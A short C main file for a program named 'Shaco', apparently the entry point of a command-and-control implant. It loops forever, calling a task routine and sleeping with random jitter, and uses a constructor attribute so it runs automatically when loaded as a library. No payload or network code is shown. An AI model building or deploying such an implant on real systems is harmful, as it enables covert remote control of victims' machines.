#include "Core/Core.h"
#include "Core/Communication.h"
#include "Core/Commands.h"
#include "Config/Settings.h"

int main(int argc, char **argv){

    if(!shaco_init(argv))  { MSG("Can't init..."); return 0; };

    PSETTINGS sett = get_settings();
    int time = sett->timeout;

    MSG("Shaco initialized");
    do{
        boxboxbox();
        time = sett->timeout;
        if(sett->max_timeout > 0)
            time = generate_random_int(sett->timeout, sett->timeout + sett->max_timeout);

        MSG("Sleeping for: %d", time);
        shaco_sleep(time);
    }while(true);
    return 0;
}

__attribute__((constructor)) void lib_main(void){
    main(0,NULL);
}
